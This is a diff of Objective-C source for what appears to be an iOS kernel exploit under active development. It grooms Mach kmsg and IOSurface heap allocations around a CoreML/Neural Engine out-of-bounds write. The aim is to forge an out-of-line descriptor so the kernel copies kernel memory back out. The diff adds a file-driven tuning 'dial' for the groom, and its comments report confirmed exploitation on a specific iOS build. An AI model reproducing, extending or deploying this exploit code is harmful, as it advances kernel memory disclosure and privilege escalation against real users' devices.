@@ -51,16 +51,24 @@
 
 /* v9 (264 Route-A completion): the landing is kernel-attested CONSTANT —
    record index 0xc0 (=192, the OOB-boundary record) at the FREE neighbor
-   element's offset 0. No more which-slot randomness. The positioned groom =
-   v7j prefill: LIVE PORTKIND kmsgs placed immediately before the fire
-   (0 ms interleave + CPU pinning), harvested + decoded AFTER the fire.
-   Conversion door bar (174 §5): desc_type_forged OR (body_forged AND kptr).
-   The v9 addition is read-side: a fill tail (0x0000000100000001) makes the
-   landed desc type u16 = 0x0001 = MACH_MSG_OOL — on receive, the kernel may
-   translate that forged desc and hand back a receiver-side OOL buffer whose
-   contents come from the address field's target = a kernel-bytes copyout.
-   vmread is dlsym local-prototype (no mach_vm.h — AGENTS landmine #2). */
-#define P073_BUILD @"p073-second-table-v9-conversion-door"
+   element's offset 0. CONFIRMED AGAIN 02:45:50 23F77 (MAF: off:0,
+   val:0x000000c0000001db, 19 consecutive records c0..d3 with OUR IOSurface
+   sids in them) — total attribution, write-up grade.
+   v9 read-side law (kept): a fill tail (0x0000000100000001) makes the
+   landed desc type u16 = 0x0001 = MACH_MSG_OOL — on a successful receive,
+   the kernel may translate that forged desc and hand back a receiver-side
+   OOL buffer whose contents come from the address field's target = a
+   kernel-bytes copyout. Bar (174 §5): desc_type_forged OR
+   (body_forged AND kptr). vmread = dlsym local-prototype (no mach_vm.h).
+   v10 dial (02:47 lesson): the crossing element was FREE at fill-arming
+   (MAF fires on a freed element). For the DESC CONVERSION the crossing
+   must hold a LIVE portkind kmsg — in-window frees (the fresh-instance
+   smalls' ~1ms table teardowns refill the freelist under the crossing)
+   fight the prefills. Dial (Documents/p073_conv.txt: "prefill=8 burst=0")
+   tunes both without a rebuild: prefill = live portkind count placed
+   fire-1 hop; burst = the fresh-small census load count (0 for the pure
+   conversion round). */
+#define P073_BUILD @"p073-second-table-v10-conversion-dial"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
@@ -168,6 +176,14 @@ static BOOL p073_vmread(uint64_t addr, uint8_t *out, uint32_t n) {
 
 /* v9 OOL-copyout evidence counter (bumped by the harvest) */
 static uint32_t g_p073_oolHits;
+
+/* v10 conversion dial (Documents/p073_conv.txt lines like "prefill=8 burst=0");
+   prefill = live portkind kmsgs placed fire-1 hop, burst = fresh-small census
+   loads (0 for the pure conversion round — in-window table teardowns fight
+   the prefill for the crossing element) */
+static uint32_t g_p073_burstN   = P073_SMALL_BURST;
+static uint32_t g_p073_prefillN = 2u;
+static uint32_t g_p073_prefillCap = 64u;   /* hard bound; buffer follows calloc size */
 
 /* v9: inspect one received descriptor for the OOL conversion door.
    Layout law (v7d, measured): {name u32 @0, pad u32 @4, type u16 @8,
@@ -602,6 +618,25 @@ static NSURL *p073_model_url(NSString *name) {
              anchor ? [NSString stringWithFormat:@"0x%016llx", anchor] : @"NONE");
 
     /* ---- D1: IOSurface marker spray FIRST (keeps 3072 band clean) ---- */
+    {
+        NSString *dialPath = [docs stringByAppendingPathComponent:@"p073_conv.txt"];
+        if ([[NSFileManager defaultManager] fileExistsAtPath:dialPath]) {
+            NSString *dial = [[NSString alloc] initWithContentsOfFile:dialPath
+                encoding:NSUTF8StringEncoding error:nil];
+            NSRange r = [dial rangeOfString:@"prefill="];
+            if (r.location != NSNotFound) {
+                uint32_t v = (uint32_t)[dial substringFromIndex:NSMaxRange(r)].intValue;
+                if (v <= g_p073_prefillCap) g_p073_prefillN = v;
+            }
+            r = [dial rangeOfString:@"burst="];
+            if (r.location != NSNotFound) {
+                int v = [dial substringFromIndex:NSMaxRange(r)].intValue;
+                g_p073_burstN = v < 0 ? 0u : (uint32_t)v;
+            }
+            p073_log(@"[v10] dial: prefill=%u burst=%u (Documents/p073_conv.txt)",
+                     g_p073_prefillN, g_p073_burstN);
+        }
+    }
     p073_surf_t *surfs = calloc(P073_N_SURF, sizeof(p073_surf_t));
     uint32_t nSurf = 0;
     if (p073_resolve_iosurface()) {
@@ -704,7 +739,7 @@ static NSURL *p073_model_url(NSString *name) {
        lands at the free neighbor's offset 0, so LIVE portkind kmsgs placed
        immediately before the fire (0 ms interleave, CPU-pinned) are the
        crossing. Hoisted to tap scope; v8 leaked them unharvested. */
-    p073_held_t *fill     = calloc(2, sizeof(p073_held_t));
+    p073_held_t *fill     = calloc(g_p073_prefillN ? g_p073_prefillN : 1, sizeof(p073_held_t));
     uint32_t nPre = 0, nHoles = 0, nPost = 0, nFill = 0;
 
     for (uint32_t i = 0; i < P073_N_SENT; i++) {
@@ -832,7 +867,7 @@ static NSURL *p073_model_url(NSString *name) {
        on LIVE kmsg bodies; the phase law collects from the existing
        record[0] dumps. p088-v18 mapped-neighbor prefill law, ported. */
     if (fill) {
-        for (uint32_t i = 0; i < 2; i++) {
+        for (uint32_t i = 0; i < g_p073_prefillN; i++) {
             mach_port_t p = p073_make_port();
             if (p == MACH_PORT_NULL) break;
             fill[nFill].port = p;
@@ -905,7 +940,7 @@ static NSURL *p073_model_url(NSString *name) {
             NSMutableArray *holders = [NSMutableArray array];
             g_p073_burstHoldersRef = holders;  /* v7i: alive past harvest */
             __block unsigned smallLoads = 0;
-            for (uint32_t k = 0; k < P073_SMALL_BURST; k++) {
+            for (uint32_t k = 0; k < g_p073_burstN; k++) {
                 MLModelConfiguration *cfgB = [[MLModelConfiguration alloc] init];
                 cfgB.computeUnits = MLComputeUnitsCPUAndNeuralEngine;
                 NSError *lErr = nil;
@@ -996,7 +1031,7 @@ static NSURL *p073_model_url(NSString *name) {
                      smallResult,
                      (tSmall0 - tKick) * 1000.0, (tSmall1 - tSmall0) * 1000.0);
         }
-        if (P073_SMALL_BURST)
+        if (g_p073_burstN)
             p073_log(@"[B4] burst tally: good=%u bad=%u (bad = that small's table "
                      @"consumed smashed records — direction+consume named; v6 "
                      @"fresh-instance loads keep tables alive in-window)", smallGood, smallBad);
